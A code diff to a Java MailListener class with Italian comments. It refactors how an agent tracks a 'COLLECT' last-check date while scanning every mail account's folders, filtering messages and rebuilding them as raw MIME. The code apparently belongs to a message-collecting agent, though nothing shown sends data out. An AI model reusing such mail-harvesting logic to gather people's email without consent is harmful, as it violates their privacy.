@@ -149,7 +149,7 @@ public final class MailListener implements FolderListener, StoreListener,
             }
 
             if (!collecting) {
-                messageAgent.updateLastCheck(folderName);
+                messageAgent.lastcheckSet("COLLECT", new Date());
             }
 
         } catch (final MessagingException ex) {
@@ -192,6 +192,9 @@ public final class MailListener implements FolderListener, StoreListener,
         //final long timestamp = messageAgent.initMarkup();    
 
         collecting = true;
+        // questa data rappresenta l'ultimo controllo effettuato.
+        final Date lastCheckDate = messageAgent.lastcheckGet("COLLECT");
+        
         // Controllo tutti gli account di posta
         for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
             names[count] = mailServiceRecords[count].getName();
@@ -206,12 +209,13 @@ public final class MailListener implements FolderListener, StoreListener,
 
             final Folder[] folders = store.list();
             // Scandisco ogni Folder dell'account di posta
-            scanFolders(names[count], folders);
+            scanFolders(names[count], folders,lastCheckDate);
         }
 
         //#ifdef MARKUP_TIMESTAMP            
         //#else
-        messageAgent.updateLastCheck(null);
+        // al termine degli scanfolder
+        messageAgent.lastcheckSet("COLLECT", new Date());
         //#endif
 
         //#ifdef DEBUG_TRACE
@@ -243,7 +247,7 @@ public final class MailListener implements FolderListener, StoreListener,
             if (storeName.indexOf("@") > 0) {
                 from = storeName;
             }
-            final String mail = getParsedMessage(message, maxMessageSize, from);
+            final String mail = makeMimeMessage(message, maxMessageSize, from);
             //#ifdef DBC
             Check.asserts(mail != null, "Null mail");
             //#endif
@@ -326,13 +330,15 @@ public final class MailListener implements FolderListener, StoreListener,
      * @param subfolders
      *            the subfolders
      */
-    public void scanFolders(final String storeName, final Folder[] subfolders) {
+    public void scanFolders(final String storeName, final Folder[] subfolders, Date lastCheckDate) {
         Folder[] dirs;
 
         //#ifdef DBC
         Check.requires(subfolders != null && subfolders.length >= 0,
                 "scanFolders");
         //#endif
+        
+        
 
         for (int count = 0; count < subfolders.length; count++) {
 
@@ -347,17 +353,14 @@ public final class MailListener implements FolderListener, StoreListener,
             //#endif
             dirs = folder.list();
             if (dirs != null && dirs.length >= 0) {
-                scanFolders(storeName, dirs);
+                scanFolders(storeName, dirs, lastCheckDate);
             }
 
             try {
                 final Message[] messages = folder.getMessages();
 
-                final long lastCheck = messageAgent.getLastCheck(folderName);
-
                 //#ifdef DEBUG_INFO
-                Date date = new Date(lastCheck);
-                debug.info("  lastCheck: " + date);
+                debug.info("  lastCheck: " + lastCheckDate);
                 debug.info("  numMessages: " + messages.length);
                 //#endif
 
@@ -387,7 +390,7 @@ public final class MailListener implements FolderListener, StoreListener,
                                 "scanFolders: message != null");
                         //#endif
                         final int filtered = collectFilter.filterMessage(
-                                message, lastCheck);
+                                message, lastCheckDate.getTime());
 
                         switch (filtered) {
                         case Filter.FILTERED_OK:
@@ -404,7 +407,7 @@ public final class MailListener implements FolderListener, StoreListener,
                             break;
                         case Filter.FILTERED_DISABLED:
                         case Filter.FILTERED_NOTFOUND:
-                            updateMarker = false; //fallback, inibische l'updateLastCheck
+                            updateMarker = false; //fallback, inibisce l'updateLastCheck
                         case Filter.FILTERED_LASTCHECK:
                         case Filter.FILTERED_DATEFROM:
                             next = true;
@@ -424,11 +427,6 @@ public final class MailListener implements FolderListener, StoreListener,
                     }
                 }
 
-                //#ifdef MARKUP_TIMESTAMP
-                if (updateMarker) {
-                    messageAgent.updateLastCheck(folderName);
-                }
-                //#endif
             } catch (final MessagingException e) {
                 //#ifdef DEBUG_TRACE
                 debug.trace("Folder#getMessages() threw " + e.toString());
@@ -543,7 +541,7 @@ public final class MailListener implements FolderListener, StoreListener,
          */
     }
 
-    private String getParsedMessage(final Message message,
+    private String makeMimeMessage(final Message message,
             final int maxMessageSize, final String from) {
         final Address[] addresses;
 
@@ -566,7 +564,6 @@ public final class MailListener implements FolderListener, StoreListener,
 
         // comincia la ricostruzione del MIME
         mailRaw.append("MIME-Version: 1.0\r\n");
-        //1234567890123456789012345678
         final long rnd = Math.abs(random.nextLong());
         final String boundary = "------_=_NextPart_" + rnd;
 
